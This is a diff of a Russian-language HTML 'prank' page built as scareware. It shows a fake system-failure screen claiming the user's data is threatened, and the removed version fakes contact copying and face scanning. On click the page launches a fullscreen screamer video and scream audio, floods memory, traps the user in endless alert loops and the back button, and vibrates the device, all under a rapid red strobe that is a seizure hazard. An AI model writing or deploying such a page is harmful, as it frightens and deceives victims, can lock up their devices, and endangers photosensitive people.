@@ -2,75 +2,66 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>ВНИМАНИЕ: ДОСТУП ОГРАНИЧЕН</title>
+    <title>ВНИМАНИЕ: ОШИБКА</title>
     <style>
+        /* Бешеное мерцание */
         @keyframes strobe { 0% { background: #000; } 50% { background: #f00; } 100% { background: #000; } }
-        .flash { animation: strobe 0.03s infinite !important; }
-        body { background: #000; color: #0f0; text-align: center; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; display: flex; flex-direction: column; justify-content: center; }
+        .flash { animation: strobe 0.04s infinite !important; }
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; flex-direction: column; justify-content: center; }
         #scary_vid { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; }
-        .face-id-frame { border: 2px solid #0f0; width: 200px; height: 200px; margin: 20px auto; border-radius: 40px; position: relative; }
-        .scan-line { width: 100%; height: 2px; background: #0f0; position: absolute; top: 0; animation: scan 2s linear infinite; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
-        #log { font-size: 11px; color: #0f0; text-align: left; padding: 15px; background: #000a00; border: 1px solid #0f0; margin: 10px; height: 80px; overflow: hidden; }
-        .danger-text { color: red; font-weight: bold; font-size: 22px; animation: blink 0.5s infinite; }
-        @keyframes blink { 0% { opacity: 0; } 50% { opacity: 1; } 100% { opacity: 0; } }
+        .btn { padding: 25px 50px; font-size: 24px; background: #ff0000; color: #fff; border: none; border-radius: 15px; cursor: pointer; z-index: 100; }
     </style>
 </head>
 <body id="b" class="flash">
 
     <div id="ui">
-        <h1 class="danger-text">CRITICAL SYSTEM THREAT</h1>
-        <div class="face-id-frame"><div class="scan-line"></div></div>
-        <p>Идет сканирование лица для верификации...</p>
-        <div id="log"></div>
-        <p style="color: #fff; font-size: 12px;">[ Нажмите для подтверждения личности ]</p>
+        <h1>КРИТИЧЕСКИЙ СБОЙ СИСТЕМЫ</h1>
+        <p>Ваши данные под угрозой. Нажмите для восстановления.</p>
+        <button class="btn" onclick="startPrank()">ВОССТАНОВИТЬ</button>
     </div>
 
-    <video id="scary_vid" playsinline loop>
+    <!-- ВИДЕО-СКРИМЕР (Прямая ссылка) -->
+    <video id="scary_vid" playsinline loop muted>
         <source src="https://raw.githubusercontent.com" type="video/mp4">
     </video>
+
+    <!-- ОР (Прямая ссылка) -->
     <audio id="scream" src="https://raw.githubusercontent.com" loop></audio>
 
     <script>
-        const fakeNames = ["Мама", "Папа", "Брат", "Андрей", "Света", "Артем", "Максим", "Юля"];
-        setInterval(() => {
-            const l = document.getElementById('log');
-            l.innerHTML += `> Копирование контакта: ${fakeNames[Math.floor(Math.random()*fakeNames.length)]}... OK<br>`;
-            l.scrollTop = l.scrollHeight;
-        }, 1200);
-
-        window.onload = function() {
-            if (navigator.vibrate) setInterval(() => navigator.vibrate([200, 100, 200]), 1500);
-            
-            // Жуткая нагрузка на ресурсы (ОЗУ)
-            let crashArray = [];
-            setInterval(() => { 
-                for(let i=0; i<1000; i++) crashArray.push(new Array(1000000).join("!!!")); 
-            }, 25);
-            
-            for(let i=0; i<100; i++) history.pushState(null, null, location.href);
-            window.onpopstate = () => { history.go(1); alert("ПОПЫТКА ПОБЕГА ЗАФИКСИРОВАНА!"); };
-        };
-
-        window.onclick = window.ontouchstart = function() {
+        function startPrank() {
             const v = document.getElementById("scary_vid");
             const a = document.getElementById("scream");
-            document.getElementById("ui").style.display = "none";
+            const ui = document.getElementById("ui");
+
+            ui.style.display = "none";
             v.style.display = "block";
             
-            // Попытка заблокировать звук в Fullscreen
+            // Включаем звук и видео
+            v.muted = false; // Разрешаем звук после клика
             v.play();
             a.volume = 1.0;
             a.play();
-            
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
+            // Попытка на весь экран
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen();
+            }
+
+            // Забивка памяти в фоне
+            setInterval(() => {
+                let x = new Array(1000000).fill("CRASH_");
+                console.log(x);
+            }, 100);
+
+            // Бесконечные алерты через 2 секунды
             setTimeout(() => {
-                while(true) { 
-                    alert("ВАШ ТЕЛЕФОН ПОД КОНТРОЛЕМ!"); 
-                    confirm("ОТПРАВИТЬ ГАЛЕРЕЮ В СЕТЬ?");
-                }
-            }, 3000);
+                while(true) { alert("СИСТЕМА УНИЧТОЖЕНА!"); }
+            }, 2000);
+        }
+
+        window.onload = function() {
+            if (navigator.vibrate) setInterval(() => navigator.vibrate(), 1000);
         };
     </script>
 </body>
